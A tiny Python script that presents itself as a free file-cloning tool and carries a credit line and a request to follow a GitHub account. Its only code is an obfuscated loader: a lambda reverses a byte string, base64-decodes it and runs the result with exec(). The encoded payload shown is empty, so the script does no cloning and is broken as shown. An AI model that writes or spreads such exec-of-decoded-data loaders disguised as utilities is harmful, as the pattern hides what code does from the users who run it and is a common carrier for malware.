#Created by MrUser#
#Free File Cloning#
#Made in Madagascar#
#Please Follow my Github account#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))